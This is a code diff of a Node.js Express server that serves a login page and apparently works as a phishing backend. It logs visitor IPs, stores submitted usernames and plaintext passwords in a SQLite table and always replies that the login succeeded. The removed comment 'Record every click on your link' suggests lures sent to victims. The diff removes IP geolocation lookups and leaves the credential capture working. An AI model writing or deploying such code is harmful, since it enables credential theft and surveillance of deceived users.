@@ -1,7 +1,6 @@
 const express = require('express');
 const path = require('path');
 const sqlite3 = require('sqlite3').verbose();
-const fetch = require('node-fetch');
 
 const app = express();
 app.use(express.json());
@@ -15,47 +14,29 @@ db.run(`CREATE TABLE IF NOT EXISTS records (
     username TEXT,
     password TEXT,
     ip TEXT,
-    location TEXT,
     timestamp TEXT
 )`);
 
-async function getLocation(ip) {
-    if (!ip || ip === 'Unknown') return 'Unknown';
-    try {
-        const res = await fetch(`https://ipapi.co/${ip}/json/`);
-        const data = await res.json();
-        if (data && data.country_name) {
-            return `${data.city || ''}, ${data.region || ''}, ${data.country_name}`;
-        }
-    } catch (e) {}
-    return 'Unknown Location';
-}
-
-async function saveRecord(type, username = null, password = null, ip = 'Unknown') {
+function saveRecord(type, username = null, password = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
-    const location = await getLocation(ip);
-
-    db.run("INSERT INTO records (type, username, password, ip, location, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
-        [type, username, password, ip, location, timestamp]);
+    db.run("INSERT INTO records (type, username, password, ip, timestamp) VALUES (?, ?, ?, ?, ?)",
+        [type, username, password, ip, timestamp]);
 }
 
-// Record every click on your link
-app.get('/', async (req, res) => {
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
-    await saveRecord('Page Visit', null, null, ip);
+// Record visits immediately
+app.get('/', (req, res) => {
+    saveRecord('Page Visit', null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-app.get('/login.html', async (req, res) => {
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
-    await saveRecord('Page Visit', null, null, ip);
+app.get('/login.html', (req, res) => {
+    saveRecord('Page Visit', null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
-app.post('/api/login', async (req, res) => {
+app.post('/api/login', (req, res) => {
     const { username, password } = req.body;
-    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
-    await saveRecord('Login Attempt', username, password, ip);
+    saveRecord('Login Attempt', username, password, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
     res.json({ success: true });
 });
 
